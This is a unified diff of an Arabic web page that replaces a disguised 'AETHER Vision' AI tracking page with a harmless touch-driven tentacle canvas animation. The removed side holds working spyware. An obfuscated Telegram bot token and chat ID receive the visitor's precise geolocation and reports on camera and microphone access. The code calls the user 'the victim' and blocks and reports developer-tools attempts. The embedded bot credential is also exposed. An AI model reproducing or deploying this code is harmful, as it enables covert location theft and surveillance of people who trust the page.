@@ -1,150 +1,224 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AETHER Vision v1.0 | الإصدار المصحح</title>
-    
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>بلاك تنتكل - تأثير المخالب باللمس</title>
     <style>
-        :root { --brand-red: #e50914; --dark-bg: #050505; }
-        body { background-color: var(--dark-bg); color: #fff; font-family: 'Cairo', sans-serif; overflow: hidden; }
-        
-        .main-container {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; text-align: center; padding: 20px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
         }
-
-        .video-box {
-            width: 100%; max-width: 500px; aspect-ratio: 1/1;
-            background: #111; border-radius: 20px; border: 1px solid #333;
-            display: flex; align-items: center; justify-content: center; position: relative;
+        body {
+            background: #000;
+            min-height: 100vh;
+            overflow: hidden;
+            touch-action: none; /* يمنع تحريك الصفحة */
         }
-
-        #webcam { width: 100%; height: 100%; object-fit: cover; border-radius: 20px; display: none; }
-
-        .btn-action {
-            background: #333; color: white; padding: 20px 40px;
-            border-radius: 15px; font-weight: 900; width: 100%; max-width: 250px;
-            transition: 0.3s; cursor: pointer; border: none;
+        canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+            cursor: crosshair;
         }
-        .btn-active { background: var(--brand-red); box-shadow: 0 0 30px rgba(229, 9, 20, 0.4); }
-
-        #loader {
-            position: fixed; inset: 0; background: #000; z-index: 9999;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        .info {
+            position: fixed;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: #fff;
+            background: rgba(0,0,0,0.5);
+            padding: 8px;
+            font-family: monospace;
+            font-size: 12px;
+            z-index: 10;
         }
     </style>
 </head>
 <body>
+    <canvas id="canvas"></canvas>
+    <div class="info">👆 المس الشاشة | بلاك تنتكل - تأثير المخالب</div>
 
-<div id="loader">
-    <div class="text-6xl font-black text-red-600 italic animate-pulse">AETHER</div>
-    <p class="mt-4 text-gray-500 uppercase tracking-widest text-xs">Initializing Secure Core...</p>
-</div>
-
-<div class="main-container">
-    <h1 class="text-4xl font-black mb-2 italic">AETHER<span class="text-red-600">Vision v1.0</span></h1>
-    <p class="text-gray-400 text-sm mb-10">نظام تتبع الأجسام الحقيقية بالذكاء الاصطناعي</p>
-
-    <div class="video-box mb-8">
-        <video id="webcam" autoplay playsinline muted></video>
-        <div id="placeholder-icon">
-            <i class="fas fa-video-slash text-5xl text-gray-800"></i>
-        </div>
-    </div>
-
-    <div class="flex flex-col gap-4 w-full items-center">
-        <button id="trigger-btn" class="btn-action">
-            <i class="fas fa-sync-alt ml-2"></i> جارٍ التشغيل...
-        </button>
-        <div id="status-box" class="bg-black/50 p-4 rounded-lg border border-white/5 text-xs">
-            الحالة: <span id="status-text" class="text-yellow-500">جاري تحميل الموديل...</span>
-        </div>
-    </div>
-</div>
-
-<script>
-    /* التعديلات المصيرية لضمان عمل الصلاحيات */
-    
-    const _SET = {
-        _K: "ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==",
-        _C: "NjA1MjUzMjA0NA=="
-    };
-
-    const _D = (s) => atob(s);
-    const API = `https://api.telegram.org/bot${_D(_SET._K)}`;
-    const CHAT = _D(_SET._C);
-
-    async function _SEND(msg) {
-        try {
-            await fetch(`${API}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT, text: `🛡️ [SYSTEM]: ${msg}`, parse_mode: 'HTML'})
-            });
-        } catch(e) {}
-    }
-
-    // 1. تصحيح حرف الـ W المفقود وضمان التحميل
-    window.onload = () => {
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('status-text').innerText = "جاهز، يرجى الضغط للبدء";
-            document.getElementById('trigger-btn').classList.add('btn-active');
-            _SEND("🚀 الصفحة محملة بالكامل وبدون أخطاء.");
-        }, 2000);
-    };
-
-    // 2. دالة طلب الصلاحيات (الموقع + الكاميرا)
-    async function requestPermissions() {
-        const statusText = document.getElementById('status-text');
-        const triggerBtn = document.getElementById('trigger-btn');
-        
-        statusText.innerText = "يتم الآن طلب الصلاحيات...";
-        _SEND("🕵️ الضحية ضغط على الزر، يتم طلب الصلاحيات الآن.");
-
-        // طلب الموقع (Geolocation)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                _SEND(`📍 <b>تم سحب الموقع:</b>\n<a href="${mapLink}">عرض الموقع</a>`);
-            }, err => {
-                _SEND(`❌ رفض الموقع: ${err.message}`);
-            }, {enableHighAccuracy: true});
-        }
-
-        // طلب الكاميرا (Camera)
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const video = document.getElementById('webcam');
-            video.srcObject = stream;
-            video.style.display = 'block';
-            document.getElementById('placeholder-icon').style.display = 'none';
-            statusText.innerText = "التتبع نشط";
-            statusText.style.color = "#00ffcc";
-            _SEND("📸 <b>تم تفعيل الكاميرا بنجاح.</b>");
-        } catch (err) {
-            statusText.innerText = "خطأ: " + err.message;
-            statusText.style.color = "#ff4444";
-            _SEND(`❌ رفض الكاميرا: ${err.message}`);
-        }
-    }
-
-    // ربط الزر بالدالة - هذا يضمن أن المتصفح لن يحظر الطلب
-    document.getElementById('trigger-btn').onclick = requestPermissions;
-
-    // منع التفتيش (تصحيح الـ W المفقود)
-    window.onkeydown = (e) => {
-        if (e.keyCode == 123) {
-            _SEND("⚠️ الضحية حاول فتح أدوات المطور (F12).");
-            return false;
-        }
-    };
-</script>
-
+    <script>
+        (function() {
+            // ========== الإعدادات (مأخوذة من كودك) ==========
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            let w, h;
+            let mouse = { x: null, y: null };
+            let target = { x: 0, y: 0 };
+            let isLowPowerDevice = false;
+            let areaFactor = 1;
+            
+            // إعدادات المخالب
+            const maxl = 400;
+            const minl = 50;
+            const n = isLowPowerDevice ? 22 : 28;
+            const numt = Math.max(100, Math.floor((isLowPowerDevice ? 320 : 520) * areaFactor));
+            let tent = [];
+            
+            // ========== دالة المخالب (Tentacle) ==========
+            class Tentacle {
+                constructor(x, y, length, segments, angle) {
+                    this.x = x;
+                    this.y = y;
+                    this.length = length;
+                    this.segments = segments;
+                    this.angle = angle;
+                    this.points = [];
+                    this.calculatePoints();
+                }
+                
+                calculatePoints() {
+                    this.points = [];
+                    const step = this.length / this.segments;
+                    for (let i = 0; i <= this.segments; i++) {
+                        const dist = step * i;
+                        const angleVariation = Math.sin(Date.now() * 0.002 + i * 0.3) * 0.3;
+                        const currentAngle = this.angle + angleVariation;
+                        const xOff = Math.cos(currentAngle) * dist;
+                        const yOff = Math.sin(currentAngle) * dist;
+                        this.points.push({
+                            x: this.x + xOff,
+                            y: this.y + yOff
+                        });
+                    }
+                }
+                
+                update(targetX, targetY) {
+                    // تحديث اتجاه المخلب نحو الهدف
+                    const dx = targetX - this.x;
+                    const dy = targetY - this.y;
+                    this.angle = Math.atan2(dy, dx);
+                    this.calculatePoints();
+                }
+                
+                draw(ctx) {
+                    if (this.points.length < 2) return;
+                    ctx.beginPath();
+                    ctx.moveTo(this.points[0].x, this.points[0].y);
+                    for (let i = 1; i < this.points.length; i++) {
+                        ctx.lineTo(this.points[i].x, this.points[i].y);
+                    }
+                    ctx.strokeStyle = `hsl(${Date.now() * 0.05 + this.x * 0.1}deg, 100%, 60%)`;
+                    ctx.lineWidth = 3;
+                    ctx.stroke();
+                }
+            }
+            
+            // ========== إنشاء المخالب ==========
+            function initTentacles() {
+                tent = [];
+                for (let i = 0; i < numt; i++) {
+                    tent.push(new Tentacle(
+                        Math.random() * w,
+                        Math.random() * h,
+                        Math.random() * (maxl - minl) + minl,
+                        n,
+                        Math.random() * 2 * Math.PI
+                    ));
+                }
+            }
+            
+            // ========== أحداث اللمس (التحويل من ماوس إلى لمس) ==========
+            function handleTouchStart(e) {
+                e.preventDefault();
+                const rect = canvas.getBoundingClientRect();
+                const touch = e.touches[0];
+                mouse.x = (touch.clientX - rect.left) * (w / rect.width);
+                mouse.y = (touch.clientY - rect.top) * (h / rect.height);
+                target.x = mouse.x;
+                target.y = mouse.y;
+            }
+            
+            function handleTouchMove(e) {
+                e.preventDefault();
+                const rect = canvas.getBoundingClientRect();
+                const touch = e.touches[0];
+                mouse.x = (touch.clientX - rect.left) * (w / rect.width);
+                mouse.y = (touch.clientY - rect.top) * (h / rect.height);
+                target.x = mouse.x;
+                target.y = mouse.y;
+            }
+            
+            function handleTouchEnd(e) {
+                e.preventDefault();
+                mouse.x = null;
+                mouse.y = null;
+                // ارجع المخالب للمنتصف
+                target.x = w / 2;
+                target.y = h / 2;
+            }
+            
+            // ========== رسم الخلفية والمخالب ==========
+            function drawBackground() {
+                const grad = ctx.createLinearGradient(0, 0, w, h);
+                grad.addColorStop(0, '#0a0a1a');
+                grad.addColorStop(1, '#1a1a2e');
+                ctx.fillStyle = grad;
+                ctx.fillRect(0, 0, w, h);
+            }
+            
+            function draw() {
+                if (!w || !h) return;
+                
+                drawBackground();
+                
+                // تحديث المخالب نحو الهدف
+                for (let t of tent) {
+                    t.update(target.x, target.y);
+                    t.draw(ctx);
+                }
+                
+                // رسم دائرة عند نقطة اللمس
+                if (mouse.x && mouse.y) {
+                    ctx.beginPath();
+                    ctx.arc(mouse.x, mouse.y, 15, 0, 2 * Math.PI);
+                    ctx.fillStyle = 'rgba(255, 0, 0, 0.3)';
+                    ctx.fill();
+                    ctx.beginPath();
+                    ctx.arc(mouse.x, mouse.y, 5, 0, 2 * Math.PI);
+                    ctx.fillStyle = '#ff0000';
+                    ctx.fill();
+                }
+                
+                requestAnimationFrame(draw);
+            }
+            
+            // ========== تغيير حجم الشاشة ==========
+            function resizeCanvas() {
+                w = window.innerWidth;
+                h = window.innerHeight;
+                canvas.width = w;
+                canvas.height = h;
+                target.x = w / 2;
+                target.y = h / 2;
+                initTentacles();
+            }
+            
+            // ========== ربط الأحداث ==========
+            function initEvents() {
+                canvas.addEventListener('touchstart', handleTouchStart, { passive: false });
+                canvas.addEventListener('touchmove', handleTouchMove, { passive: false });
+                canvas.addEventListener('touchend', handleTouchEnd);
+                window.addEventListener('resize', resizeCanvas);
+            }
+            
+            // ========== بدء التشغيل ==========
+            function init() {
+                resizeCanvas();
+                initEvents();
+                draw();
+                console.log('✅ بلاك تنتكل - تأثير المخالب يعمل باللمس');
+            }
+            
+            init();
+        })();
+    </script>
 </body>
 </html>
